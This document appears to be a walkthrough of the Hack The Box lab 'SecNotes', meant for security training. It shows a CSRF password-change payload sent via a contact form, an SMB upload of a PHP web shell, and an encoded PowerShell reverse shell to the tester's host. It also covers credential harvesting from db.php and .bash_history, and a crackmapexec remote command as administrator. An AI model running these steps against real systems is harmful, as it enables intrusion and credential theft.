# SecNotes

SecNotes is a medium difficulty HTB lab that focuses on weak password change mechanisms, lack of CSRF protection and insufficient validation of user input. In this walkthrough, we will go over the process of exploiting the services and gaining access to the Administrator user.

### Reconnaissance
The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
[★]$ sudo nmap -p- -sV -sC 10.129.115.236

Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-28 04:25 GMT
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.16% done; ETC: 04:27 (0:01:12 remaining)
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 44.53% done; ETC: 04:27 (0:01:11 remaining)
Nmap scan report for 10.129.115.236
Host is up (0.010s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h40m01s, deviation: 4h37m09s, median: 0s
| smb2-time: 
|   date: 2023-12-28T04:27:37
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-12-27T20:27:38-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.18 seconds
```

None of the SMB recon worked as it required authentication. Let's try to discover different files present on the server.

```
[★]$ gobuster dir -u http://10.129.115.236/ -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-files.txt 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.115.236/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/useful/SecLists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/12/28 05:09:08 Starting gobuster in directory enumeration mode
===============================================================
/register.php         (Status: 200) [Size: 1569]
/login.php            (Status: 200) [Size: 1223]
/contact.php          (Status: 302) [Size: 0] [--> login.php]
/home.php             (Status: 302) [Size: 0] [--> login.php]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/auth.php             (Status: 500) [Size: 1208]             
/.                    (Status: 302) [Size: 0] [--> login.php]
/db.php               (Status: 500) [Size: 1208]             
/Login.php            (Status: 200) [Size: 1223]             
/Register.php         (Status: 200) [Size: 1569]             
/Contact.php          (Status: 302) [Size: 0] [--> login.php]
/change_pass.php      (Status: 302) [Size: 0] [--> login.php]
                                                             
===============================================================
2023/12/28 05:09:23 Finished
===============================================================
```

After this we can explore the website to find more pages with new created user.

Credentials - test:testtest

Finally, we can got the below information from the http://10.129.115.236/contact.php

```
To: tyler@secnotes.htb
X-Powered-By: PHP/7.2.7
```

### User

##### Web attack

We can send any message to tyler which definelty can account on the website. Also tried changing password `/change_pass.php` which is also accepting GET and doesn't require the current password just the new password. Combining both of them, below payload can inform us if the attack is successful.

Exploit - https://www.websiteplanet.com/blog/report-popular-hosting-hacked/

Payload is like this:
```
http://localhost/change_pass.php?password=testtest&confirm_password=testtest&submit=submit
http://10.10.14.119:8000/complete
```
Network request like:
```
POST /contact.php HTTP/1.1

Host: 10.129.115.236
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 184
Origin: http://10.129.115.236
DNT: 1
Connection: close
Referer: http://10.129.115.236/contact.php
Cookie: PHPSESSID=j5vdm4kl262s8dnb0v362pgrlj
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

message=http%3A%2F%2Flocalhost%2Fchange_pass.php%3Fpassword%3Dtesttest%26confirm_password%3Dtesttest%26submit%3Dsubmit%0D%0Ahttp%3A%2F%2F10.10.14.119%3A8000%2Fcomplete&submit=Send

[★]$ nc -lvnp 8000
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.129.115.236.
Ncat: Connection from 10.129.115.236:57553.
GET /complete HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17134.228
Host: 10.10.14.119:8000
Connection: Keep-Alive
```

##### Reading leaked data
We got the credentials to be `tyler:testtest` now. After login we got the following information from notes:
```
\\secnotes.htb\new-site
tyler / 92g!**********%OG*&
```

Adding new found domain to list of hosts for resolution.
```
sudo tee --append /etc/hosts <<< "10.129.115.236 secnotes.htb"
```

##### Exploiting SMB permission 
[★]$ sudo crackmapexec smb secnotes.htb -u 'tyler' -p '92g!**********%OG*&' --shares
```
SMB         secnotes.htb    445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         secnotes.htb    445    SECNOTES         [+] SECNOTES\tyler:92g!**********%OG*&
SMB         secnotes.htb    445    SECNOTES         [+] Enumerated shares
SMB         secnotes.htb    445    SECNOTES         Share           Permissions     Remark
SMB         secnotes.htb    445    SECNOTES         -----           -----------     ------
SMB         secnotes.htb    445    SECNOTES         ADMIN$                          Remote Admin
SMB         secnotes.htb    445    SECNOTES         C$                              Default share
SMB         secnotes.htb    445    SECNOTES         IPC$                            Remote IPC
SMB         secnotes.htb    445    SECNOTES         new-site        READ,WRITE      
```
We have `read` and `write` access to this `new-site` share. Since we also have write permissions, we can see if we can upload the `shell.php`.

```
[★]$ smbclient -U SECNOTES/tyler \\\\secnotes.htb\\new-site
Password for [SECNOTES\tyler]:

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Dec 28 06:26:55 2023
  ..                                  D        0  Thu Dec 28 06:26:55 2023
  iisstart.htm                        A      696  Thu Jun 21 16:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 16:26:03 2018

		7736063 blocks of size 4096. 3390137 blocks available
smb: \>

smb: \> put shell.php
```

##### Getting access as user
Using the the new shell added. Let's start a reverse shell:
```
SECNOTES$@SECNOTES:C:\inetpub\new-site# powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAxADkAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA

[★]$ nc -lvnp 4444
PS C:\inetpub\new-site>
```

Getting the flag:
```
PS C:\Users\tyler\Desktop> cat user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Enumeration

PS C:\inetpub\wwwroot> type db.php
```
<?php

if ($includes != 1) {
	die("ERROR: Should not access directly.");
}

/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'secnotes');
define('DB_PASSWORD', 'q8N#9Eos%JinE57tke72');
//define('DB_USERNAME', 'root');
//define('DB_PASSWORD', 'qwer1234QWER!@#$');
define('DB_NAME', 'secnotes');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
     
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

These passwords didn't work. Opening the bash link as well didn't give anything. `PS C:\Users\tyler\Desktop> type bash.lnk`
```
L?F w??????V?	?v(???	??9P?O? ?:i?+00?/C:\V1?LIWindows@	???L???LI.h???&WindowsZ1?L<System32B	???L???L<.p?k?System32Z2??LP? bash.exeB	???L<??LU.?Y????bash.exeK-J????C:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32?%?
                    ?wN?�?]N?D.??Q???`?Xsecnotesx?<sAA??????o?:u??'?/?x?<sAA??????o?:u??'?/?=	?Y1SPS?0??C?G????sf"=dSystem32 (C:\Windows)?1SPS??XF?L8C???&?m?q/S-1-5-21-1791094074-1363918840-4199337083-1002?1SPS0?%??G�??`????%
	bash.exe@??????
                       ?)
                         Application@v(???	?i1SPS?jc(=?????O??MC:\Windows\System32\bash.exe91SPS?mD??pH?H@.?=x?hH?(?bP
PS C:\Users\tyler\Desktop> cmd /C start bash.lnk
PS C:\Users\tyler\Desktop> whoami
secnotes\tyler
```

There is an odd folder in `PS C:\> cd Windows\WinSxS` but couldn't find anything with this limited shell.

Exploring the AppData of the current user using the tree command.
```
PS C:\Users\tyler\AppData> tree 
Folder PATH listing
Volume serial number is 1E7B-9B76
C:.
????Local
?   ????Packages
?   ?   ????CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc
?   ?   ?   ????AC
?   ?   ?   ?   ????Temp
?   ?   ?   ????AppData
?   ?   ?   ????LocalCache
?   ?   ?   ?   ????Local
?   ?   ?   ?       ????Microsoft
?   ?   ?   ?           ????Windows
?   ?   ?   ?               ????Caches
?   ?   ?   ????LocalState
?   ?   ?   ?   ????rootfs
?   ?   ?   ?   ?   ????bin
?   ?   ?   ?   ?   ????boot
?   ?   ?   ?   ?   ????dev
?   ?   ?   ?   ?   ?   ????pts
?   ?   ?   ?   ?   ?   ????shm
?   ?   ?   ?   ?   ????etc
```

It was very odd as linux files are showing under this package. There was also an `Ubuntu` package in `C:\`. Based on this got the `.bash_history` file.

```
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> cat .bash_history

cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4*********#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exit
```

This history has credentials `administrator%u6!4*********#Nwnh`. See if we can get the flag now.
```
[★]$ sudo crackmapexec smb 10.129.115.236 -u 'administrator' -p 'u6!4*********#Nwnh' -x "type C:\Users\Administrator\Desktop\root.txt"

SMB         10.129.115.236  445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.129.115.236  445    SECNOTES         [+] SECNOTES\administrator:u6!4*********#Nwnh (Pwn3d!)
SMB         10.129.115.236  445    SECNOTES         [+] Executed command 
SMB         10.129.115.236  445    SECNOTES         ~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
